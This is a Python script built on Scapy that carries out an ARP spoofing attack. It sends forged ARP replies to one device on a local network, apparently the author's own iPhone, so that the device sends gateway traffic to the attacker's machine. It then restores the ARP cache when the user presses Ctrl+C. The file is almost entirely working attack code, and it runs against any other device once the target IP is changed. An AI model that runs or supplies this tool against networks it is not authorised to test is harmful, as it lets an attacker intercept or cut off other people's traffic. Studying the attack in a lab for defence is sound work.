from scapy.all import ARP, Ether, sendp, getmacbyip
import time
import sys

TARGET_IP = "192.168.2.60"     # your iPhone
GATEWAY_IP = "192.168.2.1"    # your router
INTERFACE = None               # auto-detect

print("[*] ARP Spoof Script")
print(f"[*] Target: {TARGET_IP} (your iPhone)")
print(f"[*] Gateway: {GATEWAY_IP} (your router)")

print("[*] Resolving MAC addresses...")
target_mac = getmacbyip(TARGET_IP)
gateway_mac = getmacbyip(GATEWAY_IP)

if not target_mac:
    print("[!] Could not resolve target MAC. Is your phone connected?")
    sys.exit(1)
if not gateway_mac:
    print("[!] Could not resolve gateway MAC.")
    sys.exit(1)

print(f"[*] iPhone MAC:  {target_mac}")
print(f"[*] Router MAC:  {gateway_mac}")
print("[*] Starting ARP spoofing... Press Ctrl+C to stop.\n")

# Craft the malicious ARP reply:
# Tells the iPhone that the router's IP is at OUR mac address
poison_pkt = Ether(dst=target_mac) / ARP(
    op="is-at",
    psrc=GATEWAY_IP,
    pdst=TARGET_IP,
    hwdst=target_mac
)

try:
    count = 0
    while True:
        sendp(poison_pkt, verbose=False)
        count += 1
        print(f"\r[*] Sent {count} spoofed ARP packets...", end="", flush=True)
        time.sleep(1)
except KeyboardInterrupt:
    print(f"\n\n[*] Stopping attack. Restoring ARP table...")
    # Send correct ARP to restore the phone's ARP cache
    restore_pkt = Ether(dst=target_mac) / ARP(
        op="is-at",
        psrc=GATEWAY_IP,
        hwsrc=gateway_mac,
        pdst=TARGET_IP,
        hwdst=target_mac
    )
    for _ in range(5):
        sendp(restore_pkt, verbose=False)
        time.sleep(0.5)
    print("[*] ARP table restored. Your phone should be back online.")
